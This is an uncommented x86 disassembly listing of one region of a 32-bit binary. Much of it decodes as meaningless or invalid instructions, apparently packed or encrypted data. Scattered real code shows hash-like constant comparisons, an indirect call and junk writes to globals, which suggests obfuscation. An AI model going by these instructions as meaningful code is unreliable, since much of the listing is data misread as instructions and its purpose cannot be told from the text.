  41ad3e:	imul   esp,DWORD PTR [eax+0x4c3f396a],0x596cb9a6
  41ad48:	push   edi
  41ad49:	not    DWORD PTR [ebp+0x5]
  41ad4c:	ss das 
  41ad4e:	mov    ebx,0xbeb63d6f
  41ad53:	mov    dl,0xd8
  41ad55:	cmc    
  41ad56:	fdivr  st(1),st
  41ad58:	add    eax,0xc34948ad
  41ad5d:	in     al,0xae
  41ad5f:	nop
  41ad60:	(bad)  
  41ad61:	push   esp
  41ad62:	sbb    DWORD PTR [ebp-0x7d],0x14
  41ad66:	in     al,0x44
  41ad68:	dec    eax
  41ad69:	popa   
  41ad6a:	aas    
  41ad6b:	call   0x33d8673f
  41ad70:	(bad)  
  41ad71:	sbb    BYTE PTR [edx+0x2a],0xb3
  41ad75:	mov    ebx,DWORD PTR [eax+0x1334f1d9]
  41ad7b:	enter  0x78fc,0xd5
  41ad7f:	addr16 or al,0x77
  41ad82:	fiadd  WORD PTR [ecx]
  41ad84:	pop    ss
  41ad85:	sub    eax,0x91388b41
  41ad8a:	cld    
  41ad8b:	cdq    
  41ad8c:	sub    bl,al
  41ad8e:	add    ah,BYTE PTR [eax+0x38]
  41ad91:	(bad)  
  41ad92:	jae    0x41ae0b
  41ad94:	test   al,0xed
  41ad96:	iret   
  41ad97:	in     eax,0xc8
  41ad99:	inc    eax
  41ad9a:	jno    0x41ad88
  41ad9c:	fst    st(4)
  41ad9e:	mov    eax,0xd5ec2db9
  41ada3:	inc    eax
  41ada4:	sub    ah,BYTE PTR es:[esi+0x736c5f46]
  41adab:	js     0x41ae0f
  41adad:	mov    dh,0xa2
  41adaf:	pop    ebp
  41adb0:	dec    ebp
  41adb1:	bound  ebp,QWORD PTR [eax]
  41adb3:	stc    
  41adb4:	jmp    DWORD PTR [eax]
  41adb6:	xor    esp,DWORD PTR [ebx-0x1ebe406a]
  41adbc:	and    BYTE PTR [ecx],dl
  41adbe:	jne    0x41ad8b
  41adc0:	xor    al,0xaf
  41adc3:	mov    al,0xdf
  41adc5:	push   cs
  41adc6:	das    
  41adc7:	in     eax,dx
  41adc8:	sbb    al,0xf8
  41adca:	dec    ecx
  41adcb:	add    DWORD PTR [esi+ebx*2-0x35e0b73d],edx
  41add2:	dec    edx
  41add3:	ins    BYTE PTR es:[edi],dx
  41add4:	push   esp
  41add5:	clc    
  41add6:	dec    edi
  41add7:	sahf   
  41add8:	clc    
  41add9:	jmp    DWORD PTR [ebx+0x607f90be]
  41addf:	push   ecx
  41ade0:	stos   BYTE PTR es:[edi],al
  41ade1:	pusha  
  41ade2:	mov    dl,0x6d
  41ade4:	in     eax,0xa8
  41ade6:	cld    
  41ade7:	pop    ecx
  41ade8:	xchg   ecx,eax
  41ade9:	pop    ebx
  41adea:	into   
  41adeb:	push   cs
  41adec:	mov    ebp,0xa8de2ed0
  41adf1:	(bad)  [ebx]
  41adf3:	xchg   ebx,eax
  41adf4:	sbb    DWORD PTR [ebx-0x32],0xffffffed
  41adf8:	adc    eax,0x33856b17
  41adfd:	mul    bl
  41adff:	test   esi,edx
  41ae01:	adc    DWORD PTR [eax],ebx
  41ae03:	cld    
  41ae04:	fisubr WORD PTR [edi]
  41ae06:	call   0x9421:0xedeb197c
  41ae0d:	in     al,0xdf
  41ae0f:	dec    eax
  41ae10:	xchg   ebp,eax
  41ae11:	cmp    eax,0xa830f2d4
  41ae16:	cld    
  41ae17:	and    BYTE PTR [ebx-0x44],al
  41ae1a:	mov    ebp,esi
  41ae1c:	stos   DWORD PTR es:[edi],eax
  41ae1d:	pop    eax
  41ae1e:	repz jbe 0x41ae5d
  41ae21:	sub    al,0x1e
  41ae23:	jns    0x41ae3b
  41ae25:	out    0x64,eax
  41ae27:	cmc    
  41ae28:	out    0x98,eax
  41ae2a:	outs   dx,BYTE PTR ds:[esi]
  41ae2b:	in     eax,dx
  41ae2c:	stc    
  41ae2d:	enter  0xfc95,0x62
  41ae31:	jmp    0x41adf9
  41ae33:	out    0x96,eax
  41ae35:	jmp    0xd876:0x62053053
  41ae3c:	pushf  
  41ae3d:	dec    edi
  41ae3e:	mov    dl,0xb
  41ae40:	jp     0x41ae3b
  41ae42:	sub    eax,0xf6802935
  41ae47:	xchg   cl,bl
  41ae49:	cmp    al,0xf6
  41ae4b:	adc    DWORD PTR [ebx-0x59],ebx
  41ae4e:	cdq    
  41ae4f:	nop
  41ae50:	retf   0xdc8c
  41ae53:	in     al,dx
  41ae54:	aas    
  41ae55:	jp     0x41ae21
  41ae57:	mov    dh,0x90
  41ae59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae5a:	popf   
  41ae5b:	jns    0x41ae94
  41ae5d:	sub    esp,esp
  41ae5f:	sahf   
  41ae60:	sub    eax,0x2d347997
  41ae65:	loope  0x41ae91
  41ae67:	add    BYTE PTR [eax],al
  41ae69:	and    eax,0x6f90
  41ae6e:	mov    DWORD PTR [esp+0x30],eax
  41ae72:	mov    DWORD PTR [esp+0x10],0x1515
  41ae7a:	mov    eax,DWORD PTR [esp+0x10]
  41ae7e:	jmp    0x41b0db
  41ae83:	sub    al,0xff
  41ae85:	jmp    0xe1b3:0xbcbce956
  41ae8c:	in     al,0x38
  41ae8e:	xchg   edx,eax
  41ae8f:	and    BYTE PTR cs:[edx-0x3fce1c5c],bh
  41ae96:	mov    esi,0xbebec235
  41ae9b:	push   edi
  41ae9c:	outs   dx,DWORD PTR ds:[esi]
  41ae9d:	mov    dh,0x91
  41ae9f:	mov    cl,0xfc
  41aea1:	sbb    eax,0x550dcb70
  41aea6:	pop    ds
  41aea7:	ins    DWORD PTR es:[edi],dx
  41aea8:	adc    al,0xbd
  41aeaa:	or     al,0x33
  41aeac:	or     DWORD PTR [edx+0x67c43e8],esp
  41aeb2:	add    cl,ah
  41aeb4:	mov    ds:0x2fc2bddc,eax
  41aeb9:	xchg   edx,eax
  41aeba:	xchg   DWORD PTR [edi+0x47],ebp
  41aebd:	lds    esi,FWORD PTR [edx]
  41aebf:	push   ss
  41aec0:	mov    dl,0xf1
  41aec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aec3:	adc    DWORD PTR [esi+0x2057b572],0x2519ad84
  41aecd:	loope  0x41aebd
  41aecf:	mov    dh,al
  41aed1:	pop    ds
  41aed2:	fisttp DWORD PTR [edi-0x71]
  41aed5:	jbe    0x41aedc
  41aed7:	and    ebp,edi
  41aed9:	rcr    DWORD PTR [esi-0x18],cl
  41aedc:	outs   dx,BYTE PTR ds:[esi]
  41aedd:	mov    eax,ds:0xaab5914
  41aee2:	dec    ebp
  41aee3:	bound  cx,DWORD PTR [eax-0x3247d3d0]
  41aeea:	sub    eax,0x1221e1f2
  41aeef:	fsubr  DWORD PTR [edx+ecx*2]
  41aef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aef3:	dec    edx
  41aef5:	adc    al,0x39
  41aef7:	gs xor eax,0xaa04fd2f
  41aefd:	cmp    BYTE PTR [edx],0xef
  41af00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af01:	xor    BYTE PTR [ebx+0x26656579],ah
  41af07:	test   BYTE PTR [esi+0x8],0x42
  41af0b:	sbb    al,0xa2
  41af0d:	sub    eax,0xa4a16f67
  41af12:	cld    
  41af13:	jp     0x41af58
  41af15:	inc    edx
  41af16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af17:	les    ebx,FWORD PTR [edx]
  41af19:	xor    edi,esp
  41af1b:	out    0xd0,al
  41af1d:	push   ss
  41af1e:	and    al,BYTE PTR [ebx-0x50]
  41af21:	jmp    0x5e2e:0x650692a2
  41af28:	std    
  41af29:	adc    BYTE PTR [eax+ebp*2+0x6b],ah
  41af2d:	jmp    0x42ba8d97
  41af32:	jmp    0xd36487
  41af37:	ss or  al,0x54
  41af3a:	loopne 0x41aed6
  41af3c:	jae    0x41aecd
  41af3e:	dec    ecx
  41af3f:	push   ss
  41af40:	test   eax,0x3a41ecf
  41af45:	push   esp
  41af46:	xor    bl,bl
  41af48:	dec    ebx
  41af49:	retf   
  41af4a:	std    
  41af4b:	push   cs
  41af4c:	ins    DWORD PTR es:[edi],dx
  41af4d:	(bad)  
  41af4e:	in     eax,0xd0
  41af50:	inc    ecx
  41af51:	sub    cl,BYTE PTR [edx]
  41af53:	popf   
  41af54:	xchg   esi,eax
  41af55:	shl    DWORD PTR [eax+0x5569d9d],cl
  41af5b:	out    dx,eax
  41af5c:	pusha  
  41af5d:	sar    BYTE PTR [ebx+0x6c],1
  41af60:	mov    ?,WORD PTR [edx+0x11ca87c4]
  41af66:	ficom  WORD PTR [edi]
  41af68:	inc    esp
  41af69:	adc    bh,BYTE PTR [ebx-0x33a18210]
  41af6f:	ins    DWORD PTR es:[edi],dx
  41af70:	or     al,0xed
  41af72:	call   0xfa3c387f
  41af77:	jnp    0x41af13
  41af79:	jmp    0xbd78:0x5303bcf7
  41af80:	popa   
  41af81:	add    ebx,eax
  41af83:	aas    
  41af84:	es or  eax,0xbee0cc9f
  41af8a:	cmp    BYTE PTR [eax+0x47296f7],dh
  41af90:	mov    DWORD PTR [ebx],ebp
  41af92:	cmp    ebp,DWORD PTR [ecx]
  41af94:	jmp    0x41af96
  41af96:	inc    di
  41af98:	out    dx,al
  41af99:	call   0xf96c:0xcd4ff8d
  41afa0:	xchg   DWORD PTR [ebx],ecx
  41afa2:	loopne 0x41af3a
  41afa4:	cmp    esp,eax
  41afa6:	mov    edx,0xd562ec6
  41afab:	pop    ecx
  41afac:	rcr    BYTE PTR [edx-0x5d716025],cl
  41afb2:	sbb    al,0xdf
  41afb4:	stos   DWORD PTR es:[edi],eax
  41afb5:	shl    DWORD PTR [esi+0x72e19853],1
  41afbb:	and    DWORD PTR [ebp+eiz*2+0x14],eax
  41afbf:	call   0x4bb1:0x88a96230
  41afc6:	aaa    
  41afc7:	test   al,0x1f
  41afc9:	sub    eax,0xa0c812a
  41afce:	fimul  WORD PTR [ebx+edi*1]
  41afd1:	pop    ds
  41afd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afd3:	mov    ds,WORD PTR [ebx+0x35]
  41afd6:	dec    eax
  41afd7:	in     eax,dx
  41afd8:	inc    edx
  41afd9:	xchg   ebp,eax
  41afda:	or     al,0x70
  41afdc:	jp     0x41b019
  41afde:	inc    edx
  41afdf:	cwde   
  41afe0:	fiadd  WORD PTR [ebp+0x1b]
  41afe3:	sbb    eax,esp
  41afe5:	jle    0x41b03b
  41afe7:	xor    eax,DWORD PTR [esi]
  41afe9:	aad    0x23
  41afeb:	imul   eax,DWORD PTR [ecx],0x3a7ee90f
  41aff1:	sbb    dl,BYTE PTR [esi-0x1edaec16]
  41aff7:	inc    ebx
  41aff8:	nop
  41aff9:	dec    esp
  41affa:	aas    
  41affb:	pop    eax
  41affc:	inc    ebx
  41affd:	and    ah,BYTE PTR [edx]
  41afff:	push   ebp
  41b000:	fidiv  WORD PTR ds:0x940f77ad
  41b006:	clc    
  41b007:	(bad)  
  41b008:	jmp    ebx
  41b00a:	sbb    DWORD PTR [edx],esp
  41b00c:	push   ebx
  41b00e:	mov    esi,0xfe1aa262
  41b013:	stc    
  41b014:	jmp    0x7031:0xfce169b1
  41b01b:	(bad)  
  41b01c:	aam    0xd3
  41b01e:	sub    eax,0x75c18100
  41b023:	sbb    eax,edx
  41b025:	adc    ecx,DWORD PTR [edi+ebp*4-0x4c]
  41b029:	adc    dh,dh
  41b02b:	cdq    
  41b02c:	push   ds
  41b02d:	sahf   
  41b02e:	lds    esp,FWORD PTR [ebx+0x47]
  41b031:	push   edi
  41b032:	sahf   
  41b033:	dec    ecx
  41b034:	or     BYTE PTR [eax+0x15],al
  41b037:	pop    ebx
  41b038:	call   0x246c:0xf540ecb5
  41b03f:	mov    ds,WORD PTR [ebx]
  41b041:	add    ebx,edi
  41b043:	fist   WORD PTR [esp+ebx*2]
  41b046:	push   esp
  41b047:	stos   DWORD PTR es:[edi],eax
  41b048:	stos   WORD PTR es:[edi],ax
  41b04a:	sub    bh,BYTE PTR [edx]
  41b04c:	shr    eax,1
  41b04e:	or     bl,al
  41b050:	adc    DWORD PTR [ecx+0x7a],edx
  41b053:	imul   ecx,DWORD PTR [esi+esi*8+0x5e058096],0x48
  41b05b:	ds in  al,dx
  41b05d:	lock loop 0x41b020
  41b060:	mov    ecx,ds
  41b062:	cmp    eax,0x2ad6ec43
  41b067:	lods   al,BYTE PTR ds:[esi]
  41b068:	stos   BYTE PTR es:[edi],al
  41b069:	fisub  WORD PTR [ecx]
  41b06b:	fadd   QWORD PTR [ebx]
  41b06d:	cmp    eax,DWORD PTR ds:[eax+ecx*8]
  41b071:	mov    eax,0xa852d864
  41b076:	jne    0x41b024
  41b078:	cdq    
  41b079:	add    ebx,edx
  41b07b:	pop    edi
  41b07c:	nop
  41b07d:	cld    
  41b07e:	pushf  
  41b07f:	cli    
  41b080:	in     al,dx
  41b081:	or     al,0xd8
  41b083:	push   eax
  41b084:	push   ss
  41b085:	xchg   ebp,eax
  41b086:	push   esp
  41b087:	or     ah,0x91
  41b08a:	(bad)  
  41b08c:	ror    ebp,1
  41b08e:	jo     0x41b086
  41b090:	outs   dx,BYTE PTR ds:[esi]
  41b091:	cmp    DWORD PTR [ebx-0xcd086d2],ecx
  41b097:	call   0x8a70:0x291f7d9c
  41b09e:	xchg   DWORD PTR [ecx+edx*2],esp
  41b0a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0a2:	(bad)  
  41b0a4:	out    0xcf,eax
  41b0a6:	sub    eax,0xb81ab560
  41b0ab:	ins    DWORD PTR es:[edi],dx
  41b0ac:	test   ebx,edi
  41b0ae:	call   DWORD PTR [edx+0x6d08215d]
  41b0b4:	adc    eax,0x527f29e
  41b0b9:	pop    esp
  41b0ba:	pop    es
  41b0bb:	shr    ebx,0xb3
  41b0be:	sbb    al,BYTE PTR [ebx+0x15328c42]
  41b0c4:	sub    edi,DWORD PTR [ecx+esi*8-0x45]
  41b0c8:	mov    dh,0x2b
  41b0ca:	add    dh,BYTE PTR gs:0xa9827fca
  41b0d1:	out    dx,eax
  41b0d2:	clc    
  41b0d3:	sbb    eax,0xe224c523
  41b0d8:	fwait
  41b0d9:	lds    ecx,FWORD PTR gs:[ebx+0xd30244c]
  41b0e0:	adc    esi,DWORD PTR [ecx+0x0]
  41b0e3:	add    BYTE PTR ds:0x3d6a,al
  41b0e9:	cmp    ecx,eax
  41b0eb:	je     0x41b438
  41b0f1:	mov    eax,DWORD PTR [esp+0x40]
  41b0f5:	mov    edx,DWORD PTR [esp+0x18]
  41b0f9:	mov    edi,DWORD PTR [esp+0x1c]
  41b0fd:	xor    ecx,ecx
  41b0ff:	shld   ecx,eax,0x2
  41b103:	shl    eax,0x2
  41b106:	xor    eax,ebx
  41b108:	xor    ecx,esi
  41b10a:	cmp    eax,edx
  41b10c:	jne    0x41b11a
  41b112:	cmp    ecx,edi
  41b114:	je     0x41b3f1
  41b11a:	mov    eax,DWORD PTR [esp+0x44]
  41b11e:	mov    eax,DWORD PTR [esp+0x44]
  41b122:	mov    eax,DWORD PTR [esp+0x44]
  41b126:	mov    ecx,DWORD PTR [esp+0x44]
  41b12a:	jmp    0x41b387
  41b12f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b131:	lea    ecx,[ecx-0x67]
  41b134:	jnp    0x41b171
  41b136:	mov    bh,0x0
  41b138:	lods   al,BYTE PTR ds:[esi]
  41b139:	dec    esp
  41b13a:	xchg   edx,eax
  41b13b:	push   esp
  41b13c:	in     eax,0x34
  41b13e:	fstp   QWORD PTR [ebp+esi*1-0x40]
  41b142:	mov    esi,0xbebec235
  41b147:	mov    ebp,0x668c8e56
  41b14c:	ins    DWORD PTR es:[edi],dx
  41b14d:	jbe    0x41b156
  41b14f:	xor    eax,DWORD PTR [edi]
  41b151:	xor    DWORD PTR [eax+ebx*8-0x13c085e4],0x664af853
  41b15c:	xor    al,0x65
  41b15e:	inc    ebp
  41b15f:	mov    ch,0x52
  41b161:	jg     0x41b1a3
  41b163:	mov    ds:0x150a6d9a,eax
  41b168:	xor    DWORD PTR [ebx-0x18],esi
  41b16b:	sar    edx,cl
  41b16d:	cs pop ecx
  41b16f:	test   DWORD PTR [ebp-0xdb34869],ebx
  41b175:	ja     0x41b1f5
  41b177:	push   DWORD PTR [ebx+0xf]
  41b17a:	inc    ecx
  41b17b:	sbb    eax,DWORD PTR [ebx+0xa441740]
  41b181:	sahf   
  41b182:	mov    edi,0x9d0d50fc
  41b187:	or     DWORD PTR ds:0xfdd5d7c8,eax
  41b18d:	push   0x14711e29
  41b192:	stc    
  41b193:	mov    al,ds:0x4edf38c2
  41b198:	cmp    bh,BYTE PTR [ebx-0xd2c66cb]
  41b19e:	in     al,0x59
  41b1a0:	push   esi
  41b1a1:	(bad)  
  41b1a3:	cmp    DWORD PTR [edi],eax
  41b1a5:	scas   eax,DWORD PTR es:[edi]
  41b1a6:	gs adc al,cl
  41b1a9:	cmp    DWORD PTR [ebp-0x31],esp
  41b1ac:	(bad)  
  41b1ad:	xchg   ebx,eax
  41b1ae:	mov    ds:0x7343de2b,eax
  41b1b3:	nop
  41b1b4:	std    
  41b1b5:	push   ebx
  41b1b6:	bound  ebp,QWORD PTR [ecx+0x504bd75c]
  41b1bc:	mov    ds:0xc7f29ddd,eax
  41b1c1:	ret    0x329c
  41b1c4:	cmp    edi,DWORD PTR [esi]
  41b1c6:	es push cs
  41b1c8:	sub    DWORD PTR [edi+0x5c9f1548],esi
  41b1ce:	fnstcw WORD PTR [esi+0x1f]
  41b1d1:	jo     0x41b18f
  41b1d3:	test   bh,cl
  41b1d5:	add    al,0xd7
  41b1d7:	fwait
  41b1d8:	xchg   edx,eax
  41b1d9:	jo     0x41b194
  41b1db:	adc    BYTE PTR gs:[esi-0x730f671b],0x2b
  41b1e3:	pop    esi
  41b1e4:	pop    ebp
  41b1e5:	jne    0x41b1b5
  41b1e7:	jmp    0x41b265
  41b1e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1ea:	pop    esi
  41b1eb:	inc    esp
  41b1ec:	aaa    
  41b1ed:	fidiv  DWORD PTR [ebp-0x64]
  41b1f0:	inc    edi
  41b1f1:	stc    
  41b1f2:	xchg   BYTE PTR [edx-0x5345332f],ch
  41b1f8:	xor    ebp,edx
  41b1fa:	mov    ch,0xd
  41b1fc:	popf   
  41b1fd:	sbb    ebx,DWORD PTR [esi]
  41b1ff:	loope  0x41b25b
  41b201:	cmp    al,0xac
  41b203:	test   DWORD PTR [ebp+0x4],ecx
  41b206:	aas    
  41b207:	jle    0x41b1a1
  41b209:	add    esi,DWORD PTR [edi]
  41b20b:	pop    es
  41b20c:	adc    al,BYTE PTR [edi]
  41b20e:	out    dx,eax
  41b20f:	cmp    DWORD PTR [ecx-0x2b2c7b92],eax
  41b215:	and    bh,BYTE PTR [esi]
  41b217:	cmp    esp,esp
  41b219:	dec    DWORD PTR [ebx+esi*8-0x7c6f4038]
  41b220:	std    
  41b221:	jns    0x41b28e
  41b223:	xchg   edx,eax
  41b224:	sub    ebp,DWORD PTR ds:0x896e5a4f
  41b22a:	rol    BYTE PTR [edx+edi*8],0xa0
  41b22e:	mov    eax,0xbc416c96
  41b233:	xor    eax,0x27e92fa3
  41b238:	mov    cl,0x4f
  41b23a:	rcr    DWORD PTR [esp+ecx*1+0x76],0xcb
  41b23f:	ret    
  41b240:	and    al,0xaa
  41b242:	dec    edi
  41b243:	inc    edx
  41b244:	sar    BYTE PTR [ebx+0x1229cbb9],1
  41b24a:	ins    DWORD PTR es:[edi],dx
  41b24b:	(bad)  
  41b24c:	rcl    DWORD PTR [ebx-0xc],cl
  41b24f:	ret    0x8291
  41b252:	mov    al,ds:0xd11ea091
  41b257:	push   eax
  41b258:	int    0x93
  41b25a:	jp     0x41b208
  41b25c:	out    0x1a,al
  41b25e:	xor    BYTE PTR [eax],dl
  41b260:	shr    DWORD PTR [ecx+0x55],0xaa
  41b264:	cs push edi
  41b266:	sahf   
  41b267:	sahf   
  41b268:	xor    dl,BYTE PTR [ebx-0x55]
  41b26b:	aaa    
  41b26c:	dec    ecx
  41b26d:	pop    esi
  41b26e:	sub    dl,bh
  41b270:	push   esi
  41b271:	loope  0x41b265
  41b273:	(bad)  
  41b274:	je     0x41b2b5
  41b276:	sub    al,ch
  41b278:	retf   
  41b279:	xchg   DWORD PTR [ecx+eax*1+0x53e2ca93],eax
  41b280:	push   edx
  41b281:	ucomiss xmm7,DWORD PTR fs:[ebx]
  41b285:	jne    0x41b2ef
  41b287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b288:	je     0x41b241
  41b28a:	mov    edi,DWORD PTR [ebx]
  41b28c:	jecxz  0x41b285
  41b28e:	aam    0xf2
  41b290:	inc    edx
  41b291:	sbb    ebx,ebx
  41b293:	pusha  
  41b294:	add    BYTE PTR [ecx-0x6f0aa58],0xa4
  41b29b:	jbe    0x41b222
  41b29d:	mov    DWORD PTR [ecx-0x5c56f75d],ecx
  41b2a3:	neg    DWORD PTR [eax]
  41b2a5:	dec    eax
  41b2a6:	in     eax,0xce
  41b2a8:	rol    cl,cl
  41b2aa:	ror    DWORD PTR [edi+0x3b76d649],1
  41b2b0:	jae    0x41b284
  41b2b2:	imul   ebx
  41b2b4:	mov    ds:0xe06e8fae,eax
  41b2b9:	inc    edx
  41b2ba:	cwde   
  41b2bb:	(bad)  
  41b2bc:	(bad)  
  41b2be:	inc    edx
  41b2bf:	sub    eax,0x36f2e467
  41b2c4:	sbb    DWORD PTR [ebx],esi
  41b2c6:	mov    WORD PTR [ebx],es
  41b2c8:	arpl   WORD PTR [ecx+eiz*8-0x1e],si
  41b2cc:	(bad)  
  41b2cd:	aam    0xc4
  41b2cf:	in     eax,0xc0
  41b2d1:	push   0x7a
  41b2d3:	int    0xda
  41b2d5:	inc    ebp
  41b2d6:	push   edi
  41b2d7:	adc    dh,BYTE PTR [esi+0x7f]
  41b2da:	or     al,0xdd
  41b2dc:	mov    ebx,0x88f0cd70
  41b2e1:	add    esp,DWORD PTR [ebx+0x91a7586]
  41b2e7:	xchg   esi,eax
  41b2e8:	push   ebx
  41b2e9:	pop    ss
  41b2ea:	stos   BYTE PTR es:[edi],al
  41b2eb:	cmp    ch,BYTE PTR ds:0x46ae6d30
  41b2f1:	mov    ds,WORD PTR [edi-0x7]
  41b2f4:	sub    al,0xe5
  41b2f6:	lds    ebx,FWORD PTR [ecx+0x75]
  41b2f9:	(bad)  
  41b2fa:	cld    
  41b2fb:	xchg   esi,eax
  41b2fc:	or     ch,BYTE PTR [ecx]
  41b2fe:	xchg   BYTE PTR [edx+0x7d],al
  41b301:	cmp    BYTE PTR [edi+0x33845922],cl
  41b307:	mov    ds:0x763016b3,eax
  41b30c:	sahf   
  41b30d:	jmp    0x80ba65f2
  41b312:	inc    ebx
  41b313:	out    dx,al
  41b314:	lds    eax,FWORD PTR [edi+0x6c]
  41b317:	push   esi
  41b318:	dec    ebx
  41b319:	repz es push esi
  41b31c:	in     eax,dx
  41b31d:	jbe    0x41b382
  41b31f:	add    dl,BYTE PTR [ecx]
  41b321:	cs jl  0x41b387
  41b324:	cli    
  41b325:	imul   ecx,DWORD PTR [edi-0x2f],0xd6d93ca
  41b32c:	shr    edi,0xa9
  41b32f:	shr    BYTE PTR [ebx+0x50],cl
  41b332:	loop   0x41b36a
  41b334:	pop    edx
  41b335:	xchg   ecx,eax
  41b336:	jle    0x41b2ea
  41b338:	test   DWORD PTR [eax+0x1afcbbb0],ebx
  41b33e:	xchg   BYTE PTR [ebx-0x19],dl
  41b341:	pop    ebp
  41b342:	aad    0xd4
  41b344:	dec    esi
  41b345:	dec    esp
  41b346:	loope  0x41b2fe
  41b348:	aad    0xab
  41b34a:	out    dx,eax
  41b34b:	and    BYTE PTR [ebx+eiz*1+0x57],0xd2
  41b350:	inc    edx
  41b351:	aaa    
  41b352:	adc    eax,0xe8211e71
  41b357:	gs mov edi,0x8eb5fc17
  41b35d:	les    ecx,FWORD PTR [eax]
  41b35f:	push   edx
  41b360:	lock cmp DWORD PTR [eax],0xffffffe0
  41b364:	cdq    
  41b365:	mov    eax,ds:0xc44db2ac
  41b36a:	push   0x447d42f4
  41b36f:	nop
  41b370:	sub    ebx,0x1f6729d4
  41b376:	imul   esi,DWORD PTR [edx],0xffffffe9
  41b379:	dec    ebp
  41b37a:	sub    ah,al
  41b37c:	repnz mov dh,0x5f
  41b37f:	test   al,0xe5
  41b381:	sbb    al,0x66
  41b383:	mov    ecx,DWORD PTR [esi]
  41b385:	push   esi
  41b386:	jl     0x41b3bd
  41b388:	scas   eax,DWORD PTR es:[edi]
  41b389:	fwait
  41b38a:	push   es
  41b38b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b38c:	xor    ecx,0xfffffffe
  41b38f:	shr    eax,0x2
  41b392:	shl    ecx,0x1e
  41b395:	or     eax,ecx
  41b397:	xor    ecx,ecx
  41b399:	shld   ecx,eax,0x2
  41b39d:	shl    eax,0x2
  41b3a0:	xor    eax,ebx
  41b3a2:	xor    ecx,esi
  41b3a4:	cmp    eax,0xcb79b572
  41b3a9:	jne    0x41b3b7
  41b3af:	cmp    ecx,esi
  41b3b1:	je     0x41b438
  41b3b7:	mov    eax,DWORD PTR [esp+0x60]
  41b3bb:	cdq    
  41b3bc:	mov    eax,DWORD PTR [esp+0x60]
  41b3c0:	mov    ecx,edx
  41b3c2:	cdq    
  41b3c3:	shld   edx,eax,0x2
  41b3c7:	shr    ecx,0x1e
  41b3ca:	xor    edi,edi
  41b3cc:	shl    eax,0x2
  41b3cf:	or     eax,ecx
  41b3d1:	or     edx,edi
  41b3d3:	mov    ecx,edx
  41b3d5:	mov    edx,DWORD PTR [esp+0x18]
  41b3d9:	xor    eax,ebx
  41b3db:	xor    ecx,esi
  41b3dd:	mov    esi,DWORD PTR [esp+0x1c]
  41b3e1:	cmp    edx,eax
  41b3e3:	jne    0x41b3f1
  41b3e9:	cmp    esi,ecx
  41b3eb:	je     0x41b438
  41b3f1:	push   DWORD PTR ds:0x4227f8
  41b3f7:	push   DWORD PTR ds:0x42258c
  41b3fd:	mov    eax,ds:0x422708
  41b402:	mov    eax,DWORD PTR [eax+0x1a4]
  41b408:	push   DWORD PTR [eax]
  41b40a:	mov    eax,DWORD PTR [esp+0x78]
  41b40e:	call   eax
  41b410:	mov    ecx,DWORD PTR ds:0x422708
  41b416:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41b41c:	mov    DWORD PTR [ecx],eax
  41b41e:	mov    eax,ds:0x422708
  41b423:	push   0x4
  41b425:	add    eax,0x1dc
  41b42a:	push   eax
  41b42b:	lea    eax,[esp+0x84]
  41b432:	push   eax
  41b433:	call   0x411c08
  41b438:	mov    eax,DWORD PTR [esp+0x7c]
  41b43c:	mov    eax,DWORD PTR [eax]
  41b43e:	pop    edi
  41b43f:	pop    esi
  41b440:	pop    ebx
  41b441:	mov    esp,ebp
  41b443:	pop    ebp
  41b444:	ret    0xc
  41b447:	push   ebp
  41b448:	mov    ebp,esp
  41b44a:	sub    esp,0x23c
  41b450:	push   ebx
  41b451:	cmp    DWORD PTR ds:0x428565,0x0
  41b458:	mov    DWORD PTR ds:0x42834d,0x2d97
  41b462:	mov    ecx,DWORD PTR ds:0x428465
  41b468:	mov    ecx,DWORD PTR ds:0x428439
  41b46e:	not    ecx
  41b470:	jmp    0x41b4da
  41b475:	mov    eax,ds:0x428481
  41b47a:	cmp    DWORD PTR ds:0x428565,0x0
  41b481:	jge    0x41b4c9
  41b487:	push   0x73dd
  41b48c:	push   DWORD PTR [ebp-0x18]
  41b48f:	push   0x4282f3
  41b494:	push   DWORD PTR [ebp-0x10]
  41b497:	push   DWORD PTR [ebp-0x14]
  41b49a:	call   DWORD PTR ds:0x42e108
  41b4a0:	neg    ecx
  41b4a2:	movzx  ecx,WORD PTR ds:0x428361
  41b4a9:	sbb    ecx,DWORD PTR ds:0x428451
  41b4af:	mov    DWORD PTR ds:0x428361,ecx
  41b4b5:	and    ecx,DWORD PTR ds:0x428571
  41b4bb:	xor    ecx,ecx
  41b4bd:	or     ecx,DWORD PTR ds:0x428471
  41b4c3:	or     DWORD PTR ds:0x4284e5,ecx
  41b4c9:	adc    ecx,ecx
  41b4cb:	xor    ecx,ecx
  41b4cd:	movzx  ecx,BYTE PTR ds:0x428411
  41b4d4:	or     DWORD PTR ds:0x428419,ecx
  41b4da:	push   esi
  41b4db:	push   edi
  41b4dc:	cmp    DWORD PTR ds:0x42857d,0x0
  41b4e3:	mov    ecx,0x4e26
  41b4e8:	mov    DWORD PTR ds:0x428571,ebx
  41b4ee:	mov    DWORD PTR ds:0x42841d,ecx
  41b4f4:	mov    DWORD PTR ds:0x4284ed,edx
  41b4fa:	jmp    0x41b569
  41b4ff:	mov    DWORD PTR ds:0x428371,0x7065
  41b509:	cmp    DWORD PTR ds:0x42857d,0x0
  41b510:	jae    0x41b54d
  41b516:	push   0x1ec2
  41b51b:	push   DWORD PTR [ebp-0x10]
  41b51e:	push   DWORD PTR [ebp-0x10]
  41b521:	push   0x8dff
  41b526:	push   DWORD PTR [ebp-0x18]
  41b529:	push   0x428575
  41b52e:	call   DWORD PTR ds:0x42e290
  41b534:	xor    ecx,0x4175
  41b53a:	movzx  ecx,BYTE PTR ds:0x428469
  41b541:	or     ecx,DWORD PTR ds:0x42842d
  41b547:	mov    DWORD PTR ds:0x428469,ecx
  41b54d:	add    DWORD PTR ds:0x428409,edx
  41b553:	adc    ecx,0x68aa
  41b559:	add    DWORD PTR ds:0x428351,0x591d
  41b563:	dec    DWORD PTR ds:0x428481
